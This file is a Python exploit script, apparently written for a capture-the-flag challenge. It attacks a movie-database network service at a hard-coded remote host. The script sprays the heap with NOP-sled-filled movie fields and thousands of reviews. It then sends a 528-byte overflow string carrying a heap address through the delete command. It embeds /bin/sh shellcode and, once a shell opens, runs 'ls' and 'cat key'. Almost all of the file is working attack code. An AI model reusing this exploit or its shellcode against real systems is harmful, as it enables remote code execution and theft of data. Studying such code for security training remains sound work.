#!/usr/bin/python

from sock import *
import sys
import time
import errno

###############################################################################
#
#   Skeleton exploit for use                                                  #
#   Uses a nice socket library (https://github.com/hellman/sock/)             #
#   Actually read this ans feel free to modify!                               #
#
###############################################################################

LOCAL = False

if LOCAL:
    HOST = "localhost"
    PORT = "55000"
    SLEEP_TIME = 0
else:
    HOST = "54.215.5.83"
    PORT = "3036"
    SLEEP_TIME = 0
    #SLEEP_TIME = .01

NOP = "\x90"

#HEAP_ADDRESS = "\x08\xca\x40\x08"
HEAP_ADDRESS = "\x08\x68\x20\x08"
MAX_ENTRIES = 8000
#MAX_ENTRIES = 16384

# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

hacker = {"title":"Hackers",
          "director":"Iain Softley",
          "writer"  : "Rafael Moreu",
          "star1":"Jonny Lee Miller",
          "star2":"Angelina Jolie",
          "star3":"Jessie Bradford",
          "star4":"Matthew Lillard",
          "star5":"Laurence Mason",
          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
          "country":"USA",
          "budget":"UNK",
          "opening_weekend":"UNK",
          "gross":"$7,564,000",
          "runtime":"107 min",
          "aspect":"2.35 : 1",
          "composer":"Someone",
          "average_rating":"5.0"}

################################################################################
#
#   pause_script
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily
#
################################################################################
def pause_script():
    raw_input("Paused... Press enter to continue: ")

################################################################################
#
#   pause_script_msg
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily, prints a custom message
#
################################################################################
def pause_script_msg(message):
    raw_input("Paused... " + message)

################################################################################
#
#   connect
#
################################################################################
def connect():
    con = Sock(HOST + ":" + PORT)
    return con

################################################################################
#
#   clear_read_buffer
#
#   This will clear the read buffer and print all of it
#
################################################################################
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        print r
        r = con.read_one(0)

################################################################################
#
#   remove_movie
#
#   This will remove a movie, and tell you success
#
################################################################################
def remove_movie(title,con):
    # Choose the remove option from the main menu
    #con.send_line("d")
    con.send("d") 
    con.send("\n") 

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    #pause_script_msg("Press Enter to receive response")

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   review_movie
#
#   This will review a movie
#
################################################################################
def review_movie(title, review, con):
    # Choose the remove option from the main menu
    con.send_line("r")
    
    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)

    #pause_script_msg("Press Enter to send review")

    # Send the review
    con.send_line(review)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Read the response
    resp = con.read_line()

    #print "Response received: " + resp
    # Did we delete the movie?
    return "Reviewed!" in resp

################################################################################
#
#   send_movie
#
#   This will add a movie
#
################################################################################
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    con.send_line(movie["director"])
    con.send_line(movie["writer"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

################################################################################
#
#   go_interactive
#
#   Switches to an interactive mode, good for shells maybe
#   You can't get out of interactive mode
#
################################################################################
def go_interactive(con):
    con.write("ls\n")
    con.write("cat key\n")

    while True:
        time.sleep(1)
        print con.read_one(0)
        con.write(sys.stdin.readline())

################################################################################
#
#   hijack_execution
#
################################################################################
def hijack_execution(con):

    #time.sleep(5)

    # Setup overflow string
    overflow_string = ""
    #overflow_size = 512
    overflow_size = 528

    for i in range(0, overflow_size):
        overflow_string += "k"

    overflow_string += HEAP_ADDRESS

    # Choose the remove option from the main menu
    con.send_line("d")

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)

    #pause_script_msg("Press Enter to Pwn")
    
    # Send the "movie title"
    con.send_line(overflow_string)

    go_interactive(con)
    #time.sleep(SLEEP_TIME)

################################################################################
#
#   build_nop_string
#
################################################################################
def build_nop_string(size):
    nop_string = ""

    for i in range(0, size):
        #if i == (size - 2):
        #    nop_string += "\xeb\x01"
        #    return nop_string
        #else:
        #    nop_string += NOP
        nop_string += NOP

    return nop_string

################################################################################
#
#   build_string
#
################################################################################
def build_string(string, size):
    built_string = ""

    for i in range(0, size):
        built_string += string

    return built_string

################################################################################
#
#   build_movie
#
################################################################################
def build_movie():

    title           = build_nop_string(500)

    # director 300 - 6
    directorNop     = "\xb6\x68\xbb\x6f\xeb\xbd"
    director        = build_string(directorNop, 50)

    writer          = build_nop_string(300)
    star1           = build_nop_string(300)

    # star2 300 - 10
    star2Nop        = "\x77\x8e\x00\x31\x10\x03\x25\x13\xaa\x74"
    star2           = build_string(star2Nop, 30)

    star3           = build_nop_string(300)
    star4           = build_nop_string(300)
    star5           = build_nop_string(300)
    summary         = build_nop_string(2000)
    country         = build_nop_string(30)

    # budget 80 - 4
    budgetNop       = "\xf3\xc1\x83\x2e"
    budget          = build_string(budgetNop, 20)
    #budget          = build_nop_string(80)

    # open_weekend 80 - 80
    weekendNop      = ("\x46\xb2\x71\x94\x0e\x21\xf5\x65\xe2\x8f\x49\xbe\xe1\xbe\xc8\x3e\x78\xbe\xd4\x75"
        "\xd4\x7e\xcf\x44\x16\x4c\x80\x45\x76\xe0\xa8\x3c\x20\x10\x46\xe9\xd6\x06\x15\x9a\x3c\xdf\x1c\x39"
        "\x27\x08\xbd\x3b\x84\x8a\x1b\xb6\xa6\x8d\xae\x28\xdf\xb1\x75\x6e\x33\x67\x4e\xb6\x7a\x4b\x72\xf7"
        "\x70\x4e\x5a\x4c\x84\x2e\x32\x6f\xb8\x42\x1e\x84")
    opening_weekend = weekendNop
    #opening_weekend = build_nop_string(80)

    # gross 80 - 20
    grossNop        = "\x5f\x8e\xa3\xda\x1f\xb6\x5d\x1d\x16\x1c\xde\xe6\xaf\x8f\x36\x73\xbd\x39\x15\x4d"
    gross           = build_string(grossNop, 4)
    #gross           = build_nop_string(80)

    # runtime 80 - 20
    runtimeNop      = "\x6c\x1c\x57\x93\x73\xca\x3d\xa0\x9c\xbd\xdd\x8c\x7e\xa7\x21\xc1\xe5\x09\x7d\x06"
    runtime         = build_string(runtimeNop, 4)
    #runtime         = build_nop_string(80)

    # aspect 40 - 2
    aspectNop       = "\x61\x5d"
    aspect          = build_string(aspectNop, 20)
    #aspect          = build_nop_string(40)

    # composer 300 - 15
    composerNop     = "\x30\xa1\xeb\x45\x6d\x49\x2c\xb7\x93\x24\x13\x27\x61\x2a\x77"
    composer        = build_string(composerNop, 18)
    composer       += "\x30\xa1\xeb\x45\x6d\x49\x2c\xb7\x93\xde\x88\xef\x68\xe8\x8f"
    composer       += "\x8f\x1e\x08\xbd\x95\xf6\xde\x4e\x6d\x3d\x60\x86\x38\x77\x67"
    #composer        = build_nop_string(279)
    #composer       += SHELLCODE

    average_rating  = build_nop_string(3)

    movie = {           
              "title" : title,
           "director" : director,
             "writer" : writer,
              "star1" : star1,
              "star2" : star2,
              "star3" : star3,
              "star4" : star4,
              "star5" : star5,
            "summary" : summary,
            "country" : country,
             "budget" : budget,
    "opening_weekend" : opening_weekend,
              "gross" : gross,
            "runtime" : runtime,
             "aspect" : aspect,
           "composer" : composer,
     "average_rating" : average_rating
    }

    #print "title: " + `len(title)`
    #print "director: " + `len(director)`
    #print "writer: " + `len(writer)`
    #print "star1: " + `len(star1)`
    #print "star2: " + `len(star2)`
    #print "star3: " + `len(star3)`
    #print "star4: " + `len(star4)`
    #print "star5: " + `len(star5)`
    #print "summary: " + `len(summary)`
    #print "country: " + `len(country)`
    #print "budget: " + `len(budget)`
    #print "opening_weekend: " + `len(opening_weekend)`
    #print "gross: " + `len(gross)`
    #print "runtime: " + `len(runtime)`
    #print "aspect: " + `len(aspect)`
    #print "composer: " + `len(composer)`
    #print "average_rating: " + `len(average_rating)`

    return movie

################################################################################
#
#   Main
#
################################################################################

# Start the connection
con = connect()

#pause_script_msg("Press Enter to start exploit")
time.sleep(1)

movie = build_movie()

send_movie(movie, con)

print "Movie sent"
#pause_script_msg("Press Enter to start reviews")

#go_interactive(con)

# Create reviews to amplify the spray

title  = NOP + "\0"
review = build_nop_string(3)

for i in range(0, MAX_ENTRIES):
    if review_movie(title, review, con):
        print `i` + ": Review Successful!"
    else:
        print `i` + ": Review Failed!"

#if remove_movie(title, con):
#    print "Deleted!"
#else:
#    print "Didn't delete :("

hijack_execution(con)

